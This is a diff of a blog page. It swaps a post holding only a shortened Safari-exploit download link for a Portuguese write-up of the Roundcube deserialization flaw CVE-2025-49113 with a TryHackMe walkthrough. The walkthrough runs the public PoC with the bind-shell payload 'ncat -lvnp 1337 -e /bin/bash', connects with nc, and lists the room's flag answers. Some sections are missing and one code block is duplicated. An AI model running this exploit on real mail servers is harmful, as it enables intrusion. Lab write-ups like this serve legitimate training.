@@ -19,25 +19,30 @@
   <meta name="author" content="lianccc">
   <meta name="keywords" content="">
   
-    <meta name="description" content="漏洞信息漏洞名称： Apple Safari Web Content Sandbox Bypass Vulnerability 漏洞编号：  CVE： CVE-2025-24201  漏洞类型： 权限绕过 漏洞等级： 严重 漏洞描述： Apple Safari Web Content Sandbox Bypass Vulnerability是一个严重的权限绕过漏洞，允许攻击者通过越界写入绕过Saf">
+    <meta name="description" content="漏洞信息漏洞名称： Roundcube 反序列化漏洞 漏洞编号：  CVE： CVE-2025-49113  漏洞类型： 反序列化 漏洞等级： 高危 漏洞描述： Roundcube邮件系统中存在一个反序列化漏洞，允许攻击者在登录后执行远程命令。该漏洞影响版本1.5.10及以下和1.6.10及以下。攻击者可以通过构造恶意的_from参数，利用session-&gt;append()函数的不当使用，实">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Apple Safari Web Content Sandbox Bypass Vulnerability">
-<meta property="og:url" content="http://example.com/2025/06/14/github_1739276916/index.html">
+<meta property="og:title" content="Roundcube 反序列化漏洞">
+<meta property="og:url" content="http://example.com/2025/06/16/github_1978749913/index.html">
 <meta property="og:site_name" content="liancc&#39; infos blog">
-<meta property="og:description" content="漏洞信息漏洞名称： Apple Safari Web Content Sandbox Bypass Vulnerability 漏洞编号：  CVE： CVE-2025-24201  漏洞类型： 权限绕过 漏洞等级： 严重 漏洞描述： Apple Safari Web Content Sandbox Bypass Vulnerability是一个严重的权限绕过漏洞，允许攻击者通过越界写入绕过Saf">
+<meta property="og:description" content="漏洞信息漏洞名称： Roundcube 反序列化漏洞 漏洞编号：  CVE： CVE-2025-49113  漏洞类型： 反序列化 漏洞等级： 高危 漏洞描述： Roundcube邮件系统中存在一个反序列化漏洞，允许攻击者在登录后执行远程命令。该漏洞影响版本1.5.10及以下和1.6.10及以下。攻击者可以通过构造恶意的_from参数，利用session-&gt;append()函数的不当使用，实">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://github.com/AvonBorn/Profile/blob/9ff2d6ec8dbc3a47a18a7e121330828838a9cf38/enderman.gif">
-<meta property="article:published_time" content="2025-06-14T13:45:14.495Z">
-<meta property="article:modified_time" content="2025-06-14T13:45:14.495Z">
+<meta property="og:image" content="http://example.com/Pastedimage20250616175835.png">
+<meta property="og:image" content="http://example.com/Pastedimage20250616180500.png">
+<meta property="og:image" content="http://example.com/Pastedimage20250616180745.png">
+<meta property="og:image" content="http://example.com/Pastedimage20250616180844.png">
+<meta property="og:image" content="http://example.com/Pastedimage20250616181115.png">
+<meta property="og:image" content="http://example.com/Pastedimage20250616181246.png">
+<meta property="article:published_time" content="2025-06-16T21:45:22.158Z">
+<meta property="article:modified_time" content="2025-06-16T21:45:22.160Z">
 <meta property="article:author" content="lianccc">
+<meta property="article:tag" content="反序列化">
 <meta property="article:tag" content="CVE-2025:github search">
-<meta property="article:tag" content="权限绕过">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://github.com/AvonBorn/Profile/blob/9ff2d6ec8dbc3a47a18a7e121330828838a9cf38/enderman.gif">
+<meta name="twitter:image" content="http://example.com/Pastedimage20250616175835.png">
   
   
   
-  <title>Apple Safari Web Content Sandbox Bypass Vulnerability - liancc&#39; infos blog</title>
+  <title>Roundcube 反序列化漏洞 - liancc&#39; infos blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -204,7 +209,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Apple Safari Web Content Sandbox Bypass Vulnerability"></span>
+            <span id="subtitle" data-typed-text="Roundcube 反序列化漏洞"></span>
           
         </div>
 
@@ -215,8 +220,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-06-14 13:45" pubdate>
-          2025年6月14日 下午
+        <time datetime="2025-06-16 21:45" pubdate>
+          2025年6月16日 晚上
         </time>
       </span>
     
@@ -227,7 +232,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          157 字
+          512 字
         
       </span>
     
@@ -238,7 +243,7 @@
         
         
         
-          2 分钟
+          5 分钟
         
       </span>
     
@@ -275,37 +280,137 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Apple Safari Web Content Sandbox Bypass Vulnerability</h1>
+            <h1 id="seo-header">Roundcube 反序列化漏洞</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Apple Safari Web Content Sandbox Bypass Vulnerability</p>
+                <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Roundcube 反序列化漏洞</p>
 <p><strong>漏洞编号：</strong></p>
 <ul>
-<li><strong>CVE：</strong> CVE-2025-24201</li>
+<li><strong>CVE：</strong> CVE-2025-49113</li>
 </ul>
-<p><strong>漏洞类型：</strong> 权限绕过</p>
-<p><strong>漏洞等级：</strong> 严重</p>
-<p><strong>漏洞描述：</strong> Apple Safari Web Content Sandbox Bypass Vulnerability是一个严重的权限绕过漏洞，允许攻击者通过越界写入绕过Safari的Web内容沙箱。该漏洞的CVE ID为CVE-2025-24201，影响程度为严重，CVSS评分为8.8。目前尚无官方补丁可用。</p>
-<p><strong>产品厂商：</strong> Apple</p>
-<p><strong>产品名称：</strong> Safari</p>
-<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/AvonBorn/CVE-2025-24201-Exploit">https://github.com/AvonBorn/CVE-2025-24201-Exploit</a></p>
+<p><strong>漏洞类型：</strong> 反序列化</p>
+<p><strong>漏洞等级：</strong> 高危</p>
+<p><strong>漏洞描述：</strong> Roundcube邮件系统中存在一个反序列化漏洞，允许攻击者在登录后执行远程命令。该漏洞影响版本1.5.10及以下和1.6.10及以下。攻击者可以通过构造恶意的_from参数，利用session-&gt;append()函数的不当使用，实现远程代码执行。</p>
+<p><strong>产品厂商：</strong> Roundcube</p>
+<p><strong>产品名称：</strong> Roundcube</p>
+<p><strong>影响版本：</strong> ≤ 1.5.10 &#x2F; 1.6.10</p>
+<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/5kr1pt/CVE-2025-49113">https://github.com/5kr1pt/CVE-2025-49113</a></p>
 <p><strong>类型：</strong> CVE-2025:github search</p>
 <h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul>
+<li>Pastedimage20250616175835.png</li>
+<li>Pastedimage20250616180500.png</li>
+<li>Pastedimage20250616180745.png</li>
+<li>Pastedimage20250616180844.png</li>
+<li>Pastedimage20250616181115.png</li>
+<li>Pastedimage20250616181246.png</li>
 <li>README.md</li>
 </ul>
-<h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-24201-Exploit"><a href="#CVE-2025-24201-Exploit" class="headerlink" title="CVE-2025-24201-Exploit"></a>CVE-2025-24201-Exploit</h2><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>Out-of-Bounds Write Vulnerability in Apple Safari Web Content Sandbox Bypass</p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit:"></a>Exploit:</h3><h4 id="Download-here"><a href="#Download-here" class="headerlink" title="Download here"></a><a target="_blank" rel="noopener" href="https://tinyurl.com/mw54dudy">Download here</a></h4><h3 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h3><ul>
-<li><strong>CVE ID</strong>: CVE-2025-24201  <img align="right" alt="Enderman" width="180" src="https://github.com/AvonBorn/Profile/blob/9ff2d6ec8dbc3a47a18a7e121330828838a9cf38/enderman.gif" srcset="/img/loading.gif" lazyload /></li>
-<li><strong>Published</strong>: 03&#x2F;11&#x2F;2025</li>
-<li><strong>Impact</strong>: Critical</li>
-<li><strong>Exploit Availability</strong>: Not public, only private.</li>
-<li><strong>CVSS</strong>: 8.8</li>
-<li><strong>Patch Available:  (No official patch yet)</strong></li>
-</ul>
-<h3 id="Contact"><a href="#Contact" class="headerlink" title="Contact"></a>Contact</h3><ul>
-<li><strong>For inquiries, please contact:<a href="mailto:&#97;&#118;&#111;&#110;&#x62;&#97;&#x73;&#x65;&#50;&#49;&#51;&#64;&#x6f;&#117;&#116;&#x6c;&#x6f;&#111;&#x6b;&#46;&#99;&#111;&#x6d;">avonbase213@outlook.com</a></strong></li>
+<h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-49113-–-dez-anos-“em-silencio”-ate-virar-RCE-no-Roundcube"><a href="#CVE-2025-49113-–-dez-anos-“em-silencio”-ate-virar-RCE-no-Roundcube" class="headerlink" title="CVE-2025-49113 – dez anos “em silêncio” até virar RCE no Roundcube"></a>CVE-2025-49113 – dez anos “em silêncio” até virar RCE no Roundcube</h2><blockquote>
+<p><strong>Impacto</strong>: execução remota de comandos pós-login (CVSS 9.9)<br><strong>Versões afetadas</strong>: ≤ 1.5.10 &#x2F; 1.6.10<br><strong>Patched</strong>: 1.5.11 e 1.6.11</p>
+</blockquote>
+<hr>
+<h3 id="1-–-Linha-do-tempo-rapida"><a href="#1-–-Linha-do-tempo-rapida" class="headerlink" title="1 – Linha do tempo rápida"></a>1 – Linha do tempo rápida</h3><table>
+<thead>
+<tr>
+<th>Data</th>
+<th>Evento</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>~2014</td>
+<td>Introdução da rota <code>program/actions/settings/upload.php</code> com uso de <code>session-&gt;append()</code> <strong>sem validação</strong>.</td>
+</tr>
+<tr>
+<td>03 jun 2025</td>
+<td>Pesquisadores da FearsOff publicam o <em>advisory</em> e anunciam PoC.</td>
+</tr>
+<tr>
+<td>04 jun 2025</td>
+<td>Roundcube aplica <a target="_blank" rel="noopener" href="https://github.com/roundcube/roundcubemail/commit/0376f69e958a8fef7f6f09e352c541b4e7729c4d">commit 0376f69</a> (1.6-stable) e <a target="_blank" rel="noopener" href="https://github.com/roundcube/roundcubemail/commit/7408f31379666124a39f9cb1018f62bc5e2dc695">commit 7408f31</a> (1.5-lts).</td>
+</tr>
+<tr>
+<td>06 jun 2025</td>
+<td>PoC universal em PHP publicada em GitHub . (<a target="_blank" rel="noopener" href="https://github.com/fearsoff-org/CVE-2025-49113">fearsoff-org&#x2F;CVE-2025-49113</a>)</td>
+</tr>
+<tr>
+<td>10 jun 2025</td>
+<td>Primeiros relatos de exploração em massa.</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="2-–-Onde-estava-o-problema"><a href="#2-–-Onde-estava-o-problema" class="headerlink" title="2 – Onde estava o problema"></a>2 – Onde estava o problema</h3><h4 id="Codigo-vulneravel-1-6-10"><a href="#Codigo-vulneravel-1-6-10" class="headerlink" title="Código vulnerável (1.6.10)"></a>Código vulnerável (1.6.10)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// program/actions/settings/upload.php  (linha 30 aprox.)</span><br><span class="hljs-variable">$from</span> = rcube_utils::<span class="hljs-title function_ invoke__">get_input_string</span>(<span class="hljs-string">&#x27;_from&#x27;</span>, rcube_utils::<span class="hljs-variable constant_">INPUT_GET</span>);<br><span class="hljs-variable">$type</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/(add|edit)-/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$from</span>);<br><br><span class="hljs-comment">// … mais abaixo</span><br><span class="hljs-variable">$rcmail</span>-&gt;session-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$type</span> . <span class="hljs-string">&#x27;.files&#x27;</span>, <span class="hljs-variable">$id</span>, <span class="hljs-variable">$attachment</span>);<br><br></code></pre></td></tr></table></figure>
+
+<p>A entrada <code>_from</code> chega íntegra do GET, vira parte do nome de um nó na sessão e,<br>durante o primeiro <code>append()</code>, o Roundcube faz:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// program/actions/settings/upload.php (linha 30 aprox.)</span><br><br><span class="hljs-variable">$from</span> = rcube_utils::<span class="hljs-title function_ invoke__">get_input_string</span>(<span class="hljs-string">&#x27;_from&#x27;</span>, rcube_utils::<span class="hljs-variable constant_">INPUT_GET</span>);<br><br><span class="hljs-variable">$type</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/(add|edit)-/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$from</span>);<br><br><span class="hljs-comment">// … mais abaixo</span><br><br><span class="hljs-variable">$rcmail</span>-&gt;session-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$type</span> . <span class="hljs-string">&#x27;.files&#x27;</span>, <span class="hljs-variable">$id</span>, <span class="hljs-variable">$attachment</span>);<br></code></pre></td></tr></table></figure>
+
+<p>Se o arquivo existir, o RCE funcionou.</p>
+<hr>
+<h3 id="6-–-Mitigacoes"><a href="#6-–-Mitigacoes" class="headerlink" title="6 – Mitigações"></a>6 – Mitigações</h3><ol>
+<li><p><strong>Atualize</strong> imediatamente para ≥ 1.6.11 ou ≥ 1.5.11.</p>
+</li>
+<li><p>Sem update? Bloqueie qualquer <code>_from</code> contendo <code>%22</code>, <code>%7C</code>, <code>!</code>, <code>.</code> ou bytes de controle via WAF ou rewrite.</p>
+</li>
+<li><p>Desative funções perigosas (<code>proc_open</code>, <code>exec</code>, etc.) em <code>php.ini</code> quando possível.</p>
+</li>
+<li><p>Restrinja uploads no painel de configurações e monitore logs.</p>
+</li>
+</ol>
+<hr>
+<h3 id="7-Lab-TryHackme-WriteUp"><a href="#7-Lab-TryHackme-WriteUp" class="headerlink" title="7 - Lab - TryHackme - WriteUp"></a>7 - Lab - TryHackme - WriteUp</h3><h5 id="1-Recon"><a href="#1-Recon" class="headerlink" title="1. Recon"></a>1. Recon</h5><ol>
+<li><p>Abrir a VM (<code>MACHINE_IP</code>) e o AttackBox.</p>
+</li>
+<li><p>Acessar <code>http://MACHINE_IP/roundcube</code> com:</p>
+<p> <code>usuário: ellieptic</code><br> <code>senha: ChangeMe123</code></p>
+<p> Isso vai funcionar e vai logar normalmente:</p>
+<p><img src="/Pastedimage20250616175835.png" srcset="/img/loading.gif" lazyload alt="Tela de login"></p>
+</li>
+</ol>
+<hr>
+<h5 id="2-Montar-o-exploit"><a href="#2-Montar-o-exploit" class="headerlink" title="2. Montar o exploit"></a>2. Montar o exploit</h5><p>Após verificar que está tudo up, vamos executar o exploit, para isso vamos acessar a PoC postada no github informada anteriormente e fazer um gitclone:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> tmp<br><span class="hljs-built_in">cd</span> tmp<br>git <span class="hljs-built_in">clone</span> https://github.com/fearsoff-org/CVE-2025-49113<br><span class="hljs-built_in">cd</span> CVE-2025-49113<br></code></pre></td></tr></table></figure>
+
+<p><img src="/Pastedimage20250616180500.png" srcset="/img/loading.gif" lazyload alt="exploit"> </p>
+<hr>
+<h5 id="3-Preparar-o-payload"><a href="#3-Preparar-o-payload" class="headerlink" title="3. Preparar o payload"></a>3. Preparar o payload</h5><p>O uso do payload é simples, basta criar o bind shell e apontar para uma porta com o file .php seguindo o usage abaixo:</p>
+<p>php CVE-2025-49113.php &lt;<code>site</code>&gt; &lt;<code>user</code>&gt; &lt;<code>senha</code>&gt; “&lt;<code>bind shell</code>&gt;”</p>
+<p><code>php CVE-2025-49113.php http://MACHINE_IP/roundcube ellieptic ChangeMe123 &quot;ncat -lvnp 1337 -e /bin/bash&quot;</code></p>
+<p>– O script faz login, injeta o objeto PHP malicioso no parâmetro <code>_from</code>, conforme falamos anteriormente, chama o endpoint <code>upload.php</code> e depois força logout para disparar<br><code>session_decode()</code> → <code>unserialize()</code> → <code>proc_open()</code>.</p>
+<blockquote>
+<p>Às vezes ele mostra erro de CSRF; ignore e siga para o próximo passo,<br>porque o comando costuma ter sido executado mesmo assim.</p>
+</blockquote>
+<p><img src="/Pastedimage20250616180745.png" srcset="/img/loading.gif" lazyload alt="exploit"> </p>
+<hr>
+<h5 id="4-Conectar-na-shell"><a href="#4-Conectar-na-shell" class="headerlink" title="4. Conectar na shell"></a>4. Conectar na shell</h5><p>Se a bind shell deu certo, ela ta escutando na porta 1337 que passamos, so fazermos a conexão nela agora:</p>
+<p><code>nc MACHINE_IP 1337</code></p>
+<p>Shell obtida.</p>
+<p><img src="/Pastedimage20250616180844.png" srcset="/img/loading.gif" lazyload alt="shell"> </p>
+<hr>
+<h5 id="5-Respondendo-as-questoes"><a href="#5-Respondendo-as-questoes" class="headerlink" title="5. Respondendo as questões"></a>5. Respondendo as questões</h5><h4 id="Questoes-e-respostas"><a href="#Questoes-e-respostas" class="headerlink" title="Questões e respostas"></a>Questões e respostas</h4><ol>
+<li><strong>Usuário Maggie</strong><br> <em>Pergunta:</em> Um dos usuários tem o primeiro nome <strong>Maggie</strong>. Qual é o sobrenome dela?<br> <em>Resposta:</em> <code>Byte</code></li>
+</ol>
+<p>Para resolver essa questão podiamos dar um cat em &#x2F;etc&#x2F;passwd grepando o usuário da maggie, ou simplesmente dando um <code>ls</code>em <code>/home</code></p>
+<p><img src="/Pastedimage20250616181115.png" srcset="/img/loading.gif" lazyload alt="1"> </p>
+<ol start="2">
+<li><p><strong>Flag em &#x2F;etc</strong><br> <em>Pergunta:</em> Qual é o valor do sinalizador salvo em <code>/etc</code>?<br> <em>Resposta:</em> <code>THM&#123;ICE_CUBE_DESERIALISATION&#125;</code><br> Para resolver isso, dei um <code>cat /etc/flag*</code> e por sorte o nome do arquivo era flag e com isso conseguimos capturar.</p>
+<p> <img src="/Pastedimage20250616181246.png" srcset="/img/loading.gif" lazyload alt="2"></p>
+</li>
+</ol>
+<hr>
+<h3 id="7-–-Referencias"><a href="#7-–-Referencias" class="headerlink" title="7 – Referências"></a>7 – Referências</h3><ul>
+<li><p>Commit 1.6.11 – <a target="_blank" rel="noopener" href="https://github.com/roundcube/roundcubemail/commit/0376f69e958a8fef7f6f09e352c541b4e7729c4d">https://github.com/roundcube/roundcubemail/commit/0376f69e958a8fef7f6f09e352c541b4e7729c4d</a></p>
+</li>
+<li><p>Commit 1.5.11 – <a target="_blank" rel="noopener" href="https://github.com/roundcube/roundcubemail/commit/7408f31379666124a39f9cb1018f62bc5e2dc695">https://github.com/roundcube/roundcubemail/commit/7408f31379666124a39f9cb1018f62bc5e2dc695</a></p>
+</li>
+<li><p>FearsOff write-up – <a target="_blank" rel="noopener" href="https://fearsoff.org/research/roundcube">https://fearsoff.org/research/roundcube</a></p>
+</li>
+<li><p>OffSec blog – <a target="_blank" rel="noopener" href="https://www.offsec.com/blog/cve-2025-49113/">https://www.offsec.com/blog/cve-2025-49113/</a> <a target="_blank" rel="noopener" href="https://www.offsec.com/blog/cve-2025-49113/?utm_source=chatgpt.com">offsec.com</a></p>
+</li>
+<li><p>TryHackme - <a target="_blank" rel="noopener" href="https://tryhackme.com/room/roundcubecve202549113">TryHackMe | Roundcube: CVE-2025-49113</a> </p>
+</li>
+<li><p>GHSA advisory – <a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-8j8w-wwqc-x596">https://github.com/advisories/GHSA-8j8w-wwqc-x596</a> <a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-8j8w-wwqc-x596?utm_source=chatgpt.com">github.com</a></p>
+</li>
 </ul>
 
                 
@@ -340,9 +445,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/CVE-2025-github-search/" class="print-no-link">#CVE-2025:github search</a>
+        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="print-no-link">#反序列化</a>
       
-        <a href="/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/" class="print-no-link">#权限绕过</a>
+        <a href="/tags/CVE-2025-github-search/" class="print-no-link">#CVE-2025:github search</a>
       
     </div>
   
@@ -354,8 +459,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Apple Safari Web Content Sandbox Bypass Vulnerability</div>
-      <div>http://example.com/2025/06/14/github_1739276916/</div>
+      <div>Roundcube 反序列化漏洞</div>
+      <div>http://example.com/2025/06/16/github_1978749913/</div>
     </div>
     <div class="license-meta">
       
@@ -367,7 +472,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年6月14日</div>
+          <div>2025年6月16日</div>
         </div>
       
       
@@ -399,18 +504,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/06/14/weixin_4260902093/" title="社工札记：比什么都不做多做一点">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">社工札记：比什么都不做多做一点</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/06/14/github_3987148758/" title="D-Link DIR820LA1_FW105B03 ping_addr - OS Command Injection">
-                        <span class="hidden-mobile">D-Link DIR820LA1_FW105B03 ping_addr - OS Command Injection</span>
+                      <a href="/2025/06/16/github_4228570268/" title="BigAnt Office Messenger SQL注入漏洞">
+                        <span class="hidden-mobile">BigAnt Office Messenger SQL注入漏洞</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
